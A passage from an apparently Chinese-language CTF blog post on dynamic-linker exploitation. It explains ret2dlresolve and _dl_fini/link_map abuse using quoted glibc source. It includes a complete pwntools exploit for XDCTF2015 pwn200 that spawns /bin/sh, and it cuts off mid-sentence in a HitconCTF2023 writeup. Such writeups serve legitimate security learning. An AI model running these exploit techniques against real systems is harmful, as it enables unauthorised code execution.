_dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We are done with the global scope. */</span></span><br><span class="line"><span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">  THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">of the object that defines sym. Now add in the symbol</span></span><br><span class="line"><span class="comment">offset. */</span></span><br><span class="line">value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>));</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line"><span class="comment">/* We already found the symbol. The module (and therefore its load</span></span><br><span class="line"><span class="comment">address) is also known. */</span></span><br><span class="line">value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="literal">true</span>));</span><br><span class="line">result = l;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* And now perhaps the relocation addend. */</span></span><br><span class="line">value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">&amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">  value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Finally, fix up the plt itself. */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line"><span class="keyword">return</span> value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* All references to the value of l_info[DT_PLTGOT],</span></span><br><span class="line"><span class="comment">l_info[DT_STRTAB], l_info[DT_SYMTAB], l_info[DT_RELA],</span></span><br><span class="line"><span class="comment">l_info[DT_REL], l_info[DT_JMPREL], and l_info[VERSYMIDX (DT_VERSYM)]</span></span><br><span class="line"><span class="comment">have to be accessed via the D_PTR macro. The macro is needed since for</span></span><br><span class="line"><span class="comment">most architectures the entry is already relocated - but for some not</span></span><br><span class="line"><span class="comment">and we need to relocate at access time. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DL_RO_DYN_SECTION</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> D_PTR(map, i) ((map)-&gt;i-&gt;d_un.d_ptr + (map)-&gt;l_addr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> D_PTR(map, i) (map)-&gt;i-&gt;d_un.d_ptr</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>ËØ•ÂáΩÊï∞Êü•ÊâæÂáΩÊï∞ÂØπÂ∫îÁöÑÈáçÂÆö‰ΩçË°®È°πÈÄöËøá:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line"> = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL])</span><br><span class="line">+ reloc_offset (pltgot, reloc_arg));</span><br></pre></td></tr></table></figure><p>Âç≥ÈÄöËøá<code>link_map</code>‰∏≠ÁöÑ<code>l_info</code>Êï∞ÁªÑ‰∏≠ÁöÑ<code>DT_JMPREL</code>È°πÊâæÂà∞<code>.rel.plt</code>Âú∞ÂùÄÔºåÂä†‰∏äÂÖàÂâç‰º†ÂÖ•ÂèÇÊï∞<code>reloc_arg</code>ÁöÑÂÅèÁßª„ÄÇËøôÈáåÁöÑÂà©Áî®ÊñπÊ≥ïÂ∞±ÊòØÈÄöËøá‰º†ÂÖ•ÈîôËØØÁöÑ<code>reloc_arg</code>Ôºå‰ΩøÂÖ∂Êü•ÊâæÂà∞Êàë‰ª¨‰º™ÈÄ†Â•ΩÁöÑ<code>.rel.plt</code>È°πÔºåÂÆûÁé∞ÂØπÈáçÂÆö‰ΩçÈ°πÁöÑÂä´ÊåÅÔºåËß£Êûê‰∏∫Êàë‰ª¨ÊÉ≥Ë¶ÅÁöÑÂáΩÊï∞„ÄÇ</p><p>Áî±Âª∂ËøüÁªëÂÆöÁöÑÊú∫Âà∂ÂèØÁü•ÔºåÊàë‰ª¨ÈúÄË¶ÅÂÖàÂéãÊ†àÊàë‰ª¨ÈúÄË¶ÅÁöÑ<code>reloc_arg</code>ÔºåÈöèÂêéË∞ÉÁî®<code>plt0</code>„ÄÇÂπ∂Âú®ÂØπÂ∫îÂú∞ÂùÄ‰∏ä‰º™ÈÄ†Â•Ω<code>.rel.plt</code>Ôºå<code>dynsym</code>Ôºå<code>dynstr</code>„ÄÇÂú®<code>dynstr</code>‰∏≠ÂÜôÂÖ•ÊÉ≥Ë¶ÅËß£ÊûêÁöÑ‰ªªÊÑèÂáΩÊï∞Âç≥ÂèØ„ÄÇ</p><p>ÂÖ∑‰Ωì‰º™ÈÄ†ÊñπÊ≥ï‰ª•XDCTF2015 pwn200‰∏∫‰æã</p><h2 id="‰æã"><a href="#‰æã" class="headerlink" title="‰æã"></a>‰æã</h2><p>È¢òÁõÆÊ∫êÁ†Å</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">    write(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>È¢òÁõÆ‰∏∫32‰ΩçÔºåÂè™ÂºÄ‰∫ÜNXÔºåPartial RELRO<br>Áî±‰∫éÊ∫¢Âá∫ÈïøÂ∫¶‰∏çÂ§üÔºåÊàë‰ª¨ÂÖàËøõË°å‰∏ÄÊ¨°Ê†àËøÅÁßªÔºåÂú®Â∑≤Áü•ÁöÑÁõÆÊ†áÂú∞ÂùÄ‰∏äÂÜôÂÖ•Êàë‰ª¨ÁöÑ‰º™ÈÄ†È°π<br>expÂ¶Ç‰∏ã:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#-*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line">from pwn import*</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"><span class="title function_">context</span><span class="params">(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">debug</span><span class="params">(cmd = <span class="string">&#x27;&#x27;):</span></span></span><br><span class="line"><span class="string"><span class="params">if len(sys.argv)!=1:</span></span></span><br><span class="line"><span class="string"><span class="params">return</span></span></span><br><span class="line"><span class="string"><span class="params">cmd += &quot;&quot;&quot;</span></span></span><br><span class="line"><span class="string"><span class="params">b system</span></span></span><br><span class="line"><span class="string"><span class="params">&quot;&quot;&quot;</span></span></span><br><span class="line"><span class="string"><span class="params">gdb.attach(p, cmd)</span></span></span><br><span class="line"><span class="string"><span class="params">pause()</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">def exp(host = &quot;0.0.0.0&quot;, port=11451, exe = &quot;./vuln&quot;):</span></span></span><br><span class="line"><span class="string"><span class="params">  global p</span></span></span><br><span class="line"><span class="string"><span class="params">  if len(sys.argv)==1:</span></span></span><br><span class="line"><span class="string"><span class="params">    p = process(exe)</span></span></span><br><span class="line"><span class="string"><span class="params">  else:</span></span></span><br><span class="line"><span class="string"><span class="params">    p = remote(host, port)</span></span></span><br><span class="line"><span class="string"><span class="params">  pass</span></span></span><br><span class="line"><span class="string"><span class="params">  elf = ELF(&#x27;</span>./vuln<span class="string">&#x27;)</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  leave_ret = 0x08049105</span></span></span><br><span class="line"><span class="string"><span class="params">  pop3 = 0x080491e9</span></span></span><br><span class="line"><span class="string"><span class="params">  pop_ebp = 0x080491eb</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  write_plt = elf.plt[&#x27;</span>write<span class="string">&#x27;]</span></span></span><br><span class="line"><span class="string"><span class="params">  write_got = elf.got[&#x27;</span>write<span class="string">&#x27;]</span></span></span><br><span class="line"><span class="string"><span class="params">  read_plt = elf.plt[&#x27;</span>read<span class="string">&#x27;]</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  plt_0    = elf.get_section_by_name(&#x27;</span>.plt<span class="string">&#x27;).header.sh_addr</span></span></span><br><span class="line"><span class="string"><span class="params">  rel_plt  = elf.get_section_by_name(&#x27;</span>.rel.plt<span class="string">&#x27;).header.sh_addr</span></span></span><br><span class="line"><span class="string"><span class="params">  dynsym   = elf.get_section_by_name(&#x27;</span>.dynsym<span class="string">&#x27;).header.sh_addr     </span></span></span><br><span class="line"><span class="string"><span class="params">  dynstr   = elf.get_section_by_name(&#x27;</span>.dynstr<span class="string">&#x27;).header.sh_addr     </span></span></span><br><span class="line"><span class="string"><span class="params">  bss_addr = elf.get_section_by_name(&#x27;</span>.bss<span class="string">&#x27;).header.sh_addr</span></span></span><br><span class="line"><span class="string"><span class="params">  text_addr = elf.get_section_by_name(&#x27;</span>.text<span class="string">&#x27;).header.sh_addr</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  base_addr = bss_addr + 0x800</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  payload = b&quot;\x00&quot; * (112)</span></span></span><br><span class="line"><span class="string"><span class="params">  payload += flat([read_plt, pop3, 0, base_addr, 0x100, pop_ebp, base_addr -4, leave_ret])</span></span></span><br><span class="line"><span class="string"><span class="params">  p.recv()</span></span></span><br><span class="line"><span class="string"><span class="params">  p.send(payload)</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  reloc_index = base_addr + 24 - rel_plt </span></span></span><br><span class="line"><span class="string"><span class="params">  fake_sym_addr = base_addr + 32</span></span></span><br><span class="line"><span class="string"><span class="params">  align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span></span></span><br><span class="line"><span class="string"><span class="params">  fake_sym_addr += align</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  r_sym = int((fake_sym_addr - dynsym) / 0x10)</span></span></span><br><span class="line"><span class="string"><span class="params">  r_type = 0x7</span></span></span><br><span class="line"><span class="string"><span class="params">  r_info = (r_sym &lt;&lt; 8) + (r_type &amp; 0xff) </span></span></span><br><span class="line"><span class="string"><span class="params">  fake_reloc = flat([write_got, r_info])</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  st_name = fake_sym_addr + 0x10 - dynstr</span></span></span><br><span class="line"><span class="string"><span class="params">  st_bind = 0x1</span></span></span><br><span class="line"><span class="string"><span class="params">  st_type = 0x2</span></span></span><br><span class="line"><span class="string"><span class="params">  st_info = (st_bind &lt;&lt; 4) + (st_type &amp; 0xf)</span></span></span><br><span class="line"><span class="string"><span class="params">  fake_sym = flat([st_name, 0, 0, st_info])</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  payload = flat([plt_0, reloc_index, 0x08049196, base_addr + 0x80, 0, 0])</span></span></span><br><span class="line"><span class="string"><span class="params">  payload += fake_reloc</span></span></span><br><span class="line"><span class="string"><span class="params">  payload += b&quot;\x00&quot; * align</span></span></span><br><span class="line"><span class="string"><span class="params">  payload += fake_sym</span></span></span><br><span class="line"><span class="string"><span class="params">  payload += b&quot;system\x00&quot;</span></span></span><br><span class="line"><span class="string"><span class="params">  payload = payload.ljust(0x80, b&quot;\x00&quot;)</span></span></span><br><span class="line"><span class="string"><span class="params">  payload += flat([b&quot;/bin/sh\x00&quot;])</span></span></span><br><span class="line"><span class="string"><span class="params">  payload = payload.ljust(0x100, b&quot;\x00&quot;)</span></span></span><br><span class="line"><span class="string"><span class="params">  p.send(payload)</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">if __name__ == &#x27;</span>__main__<span class="string">&#x27;:</span></span></span><br><span class="line"><span class="string"><span class="params">exp()</span></span></span><br><span class="line"><span class="string"><span class="params">p.interactive()</span></span></span><br></pre></td></tr></table></figure><p>Ê≥®ÊÑèdlÁõ∏ÂÖ≥ÂáΩÊï∞Âç†Áî®ËæÉÂ§öÊ†àÁ©∫Èó¥ÔºåËøÅÁßª‰πãÂêéÂèØËÉΩÂá∫Áé∞Ê†àÁîüÈïøÂà∞ÂÖ∂‰ªñ‰∏çÂèØÂÜôÊÆµÁöÑÊÉÖÂÜµÔºåÊâÄ‰ª•ËøÅÁßªÁöÑÂú∞ÂùÄÈúÄË¶ÅÁ¶ªbssË∂≥Â§üËøú„ÄÇ</p><h2 id="64‰ΩçÊÉÖÂÜµ"><a href="#64‰ΩçÊÉÖÂÜµ" class="headerlink" title="64‰ΩçÊÉÖÂÜµ"></a>64‰ΩçÊÉÖÂÜµ</h2><p>Â≠òÂú®‰ª•‰∏ãÂå∫Âà´:</p><ul><li>Âú®32‰Ωç‰∏≠Ôºå<code>reloc_arg</code>‰Ωú‰∏∫ÂÅèÁßªÈáèÔºåËÄåÂú®64‰Ωç‰∏≠‰Ωú‰∏∫<code>.rel.plt</code>ÁöÑÊï∞ÁªÑ‰∏ãÊ†á</li><li>ÁªìÊûÑ‰ΩìÂùáÂçáÁ∫ß‰∏∫64‰ΩçÁâàÊú¨</li><li>versionÈóÆÈ¢ò<br>versionÈóÆÈ¢òÂ¶Ç‰∏ã<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum =</span><br><span class="line">  (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line"><span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>Ê≠§Â§ÑÊää<code>(reloc-&gt;r_info)&gt;&gt;32</code>‰Ωú‰∏∫‰∏ãÊ†áÂèñÂÄº<code>vernum</code>ÔºåÁî±‰∫éÊàë‰ª¨‰º™ÈÄ†ÁöÑ<code>(reloc-&gt;r_info)&gt;&gt;32</code>ÂæàÂ§ßÔºåÂØºËá¥ÂÆπÊòìÂèñÂà∞‰∏çÂèØËØªÂå∫Âüü„ÄÇ</li></ul><p>Ëß£ÂÜ≥ÊñπÊ≥ï‰πã‰∏ÄÊòØÈÅøÂÖçËøõÂÖ•ËØ•Âæ™ÁéØÔºåÂç≥‰ΩøÂæó<code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)]</code>‰∏∫0ÔºåÂú∞ÂùÄ‰∏∫<code>link_map+0x1c8</code>„ÄÇÁÑ∂ËÄåËøôÈúÄË¶ÅÊ≥ÑÈú≤ldÂú∞ÂùÄÔºåÈÉΩÊúâÂú∞ÂùÄ‰∫ÜËøòÊâìret2dlÂ∞±‰∏çÁ§ºË≤å‰∫Ü„ÄÇ</p><p>Âè¶‰∏ÄÁßçËß£ÂÜ≥ÊñπÊ°àÊòØÈÄâÊã©‰∏çËøõÂÖ•<code>if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)</code>ÁöÑÂ§ßÂæ™ÁéØÔºåËÄåÊòØËµ∞elseÂàÜÊîØ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line"><span class="comment">/* We already found the symbol. The module (and therefore its load</span></span><br><span class="line"><span class="comment">address) is also known. */</span></span><br><span class="line">value = DL_FIXUP_MAKE_VALUE (l, l-&gt;addr + sym-&gt;st_value);</span><br><span class="line">result = l;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>DL_FIXUP_MAKE_VALUE</code>Áî®‰∫éËÆ°ÁÆóÂáΩÊï∞ÁúüÂÆûÂÄº„ÄÇÊàë‰ª¨Âè™ÈúÄÂ∞Ü<code>sym-&gt;st_value</code>ÊåáÂêëÊüê‰∏™Â∑≤Ëß£ÊûêÂáΩÊï∞ÁöÑgotË°®Ôºå<code>l-&gt;addr</code>ÊåáÂêëÁõÆÊ†áÂáΩÊï∞ÂíåÂ∑≤Ëß£ÊûêÂáΩÊï∞ÁöÑÂÅèÁßª„ÄÇ</p><p>Âú®‰∏çÊ≥ÑÈú≤ldÁöÑÊÉÖÂÜµ‰∏ã‰º™ÈÄ†<code>l-&gt;addr</code>ÔºåÊàë‰ª¨ÈúÄË¶Å‰º™ÈÄ†<code>link_map</code>Ôºå‰∏ÄËà¨ÈúÄË¶ÅÊª°Ë∂≥:<br>1.<code>link_map</code>‰∏≠ÁöÑ<code>DT_STRTAB</code>„ÄÅ<code>DT_SYMTAB</code>„ÄÅ<code>DT_JMPREL</code>ÂèØËØª<br>2.<code>DT_SYMTAB</code>ÁªìÊûÑ‰Ωì‰∏≠ÁöÑ<code>d_ptr</code>Âç≥<code>sym</code>Ôºå<code>*(sym+5) &amp; 0x03 != 0</code><br>3.<code>(reloc-&gt;r_info)&amp;0xff == 7</code><br>4.<code>rel_addr = l-&gt;addr + reloc-&gt;r_offset</code>Âç≥ÂéüÂÖàÈúÄË¶Å‰øÆÊîπÁöÑgotË°®Âú∞ÂùÄÊúâÂèØÂÜôÊùÉÈôê<br>5.<code>l-&gt;l_addr + sym-&gt;st_value</code> ‰∏∫systemÁöÑÂú∞ÂùÄ</p><h1 id="dl-finiÁöÑÂà©Áî®"><a href="#dl-finiÁöÑÂà©Áî®" class="headerlink" title="_dl_finiÁöÑÂà©Áî®"></a><code>_dl_fini</code>ÁöÑÂà©Áî®</h1><h2 id="ÁâπÊÄß"><a href="#ÁâπÊÄß" class="headerlink" title="ÁâπÊÄß"></a>ÁâπÊÄß</h2><p>ËØ•ÂáΩÊï∞Âú®ld.so‰∏≠ÔºåÂú®exitÊó∂Ë∞ÉÁî®ÔºåÂπ∂ÂØπ<code>.fini</code>Âíå<code>.fini_array</code>‰∏≠ÂáΩÊï∞ËøõË°åË∞ÉÁî®„ÄÇ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Is there a destructor function? */</span></span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">|| (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>))</span><br><span class="line">  &#123;</span><br><span class="line"><span class="comment">/* When debugging print a message first. */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">&amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">_dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line"> DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">ns);</span><br><span class="line"><span class="comment">/* First see whether an array is given. */</span></span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">  (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">/ <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line"><span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">/* Next try the old-style destructor. */</span></span><br><span class="line"><span class="keyword">if</span> (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">DL_CALL_DT_FINI</span><br><span class="line">(l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÈáåÂØπ<code>.fini_array</code>ÁöÑÂÆö‰ΩçÊòØÈÄöËøá<code>l-&gt;l_addr+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code>ÂÆûÁé∞ÁöÑÔºåËøôÂ∞±Áªô‰∫ÜÊàë‰ª¨Êìç‰ΩúÁöÑÁ©∫Èó¥</p><h2 id="HitconCTF2023-Wall-Sina"><a href="#HitconCTF2023-Wall-Sina" class="headerlink" title="HitconCTF2023 Wall-Sina"></a>HitconCTF2023 Wall-Sina</h2><p>Ê∫êÁ†ÅÂ¶Ç‰∏ã:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buff[<span class="number">0x48</span>];</span><br><span class="line"><span class="type">void</span> *<span class="type">const</span> gift = main;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    read(STDIN_FILENO, buff, <span class="number">0x40</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buff);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>‰øùÊä§ÂÖ®ÂºÄ<br>Ê†à‰∏äÊÆãÁïô‰∫ÜÊåáÈíà<code>_rtld_global</code>Âíå<code>_rtld_global._dl_ns[0]._ns_loaded</code>ÔºåËØª<code>rtld_global</code>ÁªìÊûÑ‰ΩìÊ∫êÁ†ÅÂèØÁü•Ôºå<code>_ns_loaded</code>ÊòØÁªìÊûÑ‰Ωì<code>link_map</code>ÁöÑÊåáÈíà<br>ÊïÖÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáfmt‰ªªÊÑèÂÜôÂú®<code>link_map</code>ÁöÑÁ¨¨‰∏ÄÈ°πÔºå‰πüÂ∞±ÊòØ<code>l_addr</code>Â§ÑÂÜô‰ªªÊÑèÂú∞ÂùÄ„ÄÇ<br>È¢òÁõÆÂú®<code>.data.rel</code>‰øùÁïô‰∫Ü‰∏Ä‰∏™mainÁöÑÊåáÈíàÔºå‰∏îÂú®<code>.fini_array</code>Âêé‰∏çËøúÂ§ÑÔºåÊïÖÊàë‰ª¨ÂèØ‰ª•ÊîπÂÜô<code>l_addr</code>ÁöÑLSBÔºå‰Ωø<code>l-&gt;l_addr+ 